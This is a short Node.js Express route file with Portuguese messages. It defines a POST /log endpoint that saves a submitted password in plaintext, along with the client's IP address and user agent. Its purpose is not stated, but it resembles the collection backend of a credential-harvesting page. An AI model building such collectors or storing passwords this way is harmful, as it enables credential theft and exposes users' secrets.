const express = require("express");
const router = express.Router();
const db = require("../db/connection");

router.post("/log", (req, res) => {
  const { password } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];

  if (!password) {
    return res.status(400).json({ error: "Senha vazia" });
  }

  db.run(
    `INSERT INTO logs (password, ip, user_agent) VALUES (?, ?, ?)`,
    [password, ip, userAgent],
    (err) => {
      if (err) {
        return res.status(500).json({ error: "Erro no banco" });
      }
      res.json({ success: true });
    }
  );
});

module.exports = router;
